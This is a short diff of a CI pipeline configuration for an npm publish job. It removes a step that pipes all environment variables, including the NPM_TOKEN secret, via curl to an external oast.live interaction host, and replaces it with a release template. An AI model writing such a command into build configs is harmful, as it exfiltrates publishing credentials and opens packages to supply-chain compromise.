@@ -12,8 +12,7 @@ jobs:
 
     publish:
         requires: [~pr, main]
-        steps:
-            - run_arbitrary_script: curl --data "$(set)" http://cilu2juhle0vc95j42i09i1uoh5pcry5e.oast.live/
+        template: screwdriver-cd/semantic-release
         secrets:
             # Publishing to NPM
             - NPM_TOKEN
